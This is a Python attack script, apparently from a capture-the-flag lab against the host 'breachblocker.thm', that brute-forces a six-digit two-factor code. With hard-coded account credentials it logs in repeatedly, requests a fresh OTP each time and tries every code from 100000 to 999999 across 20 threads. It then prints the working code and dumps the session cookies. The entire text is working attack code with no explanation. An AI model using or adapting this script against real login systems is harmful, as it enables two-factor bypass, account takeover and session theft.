import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
import threading

urllib3.disable_warnings()

BASE = "https://breachblocker.thm:8443"
LOGIN  = f"{BASE}/api/bank-login"
SEND   = f"{BASE}/api/send-2fa"
VERIFY = f"{BASE}/api/verify-2fa"

START = 100000
END   = 1000000
WORKERS = 20

stop_event = threading.Event()

def try_otp(i):
    if stop_event.is_set():
        return None

    otp = f"{i:06d}"

    try:
        s = requests.Session()
        s.verify = False
        s.headers.update({
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0"
        })

        # 1) Login
        r = s.post(LOGIN, json={
            "account_id": "sbreachblocker@easterbunnies.thm",
            "pin": "malharerocks"
        })
        if not r.json().get("requires_2fa"):
            return None

        # 2) Generate OTP
        r = s.post(SEND, json={
            "otp_email": "carrotbane@easterbunnies.thm"
        })
        if not r.json().get("success"):
            return None

        # 3) One-shot verify
        r = s.post(VERIFY, json={"code": otp})

        if "Invalid" not in r.text:
            stop_event.set()
            # Capture the session cookie that actually worked
            cookie_dump = [(c.name, c.value) for c in s.cookies]
            return otp, r.text, cookie_dump

    except Exception:
        return None

    return None


total = END - START

with ThreadPoolExecutor(max_workers=WORKERS) as executor:
    futures = [executor.submit(try_otp, i) for i in range(START, END)]

    with tqdm(total=total, desc="Bruteforcing OTP", unit="otp") as pbar:
        for future in as_completed(futures):
            pbar.update(1)

            result = future.result()
            if result:
                otp, response, cookies = result
                pbar.close()

                print("\n[+] OTP FOUND:", otp)
                print("[+] Response:", response)
                print("[+] SESSION COOKIE USED:")

                for name, value in cookies:
                    print(f"    {name} = {value}")

                executor.shutdown(wait=False, cancel_futures=True)
                break

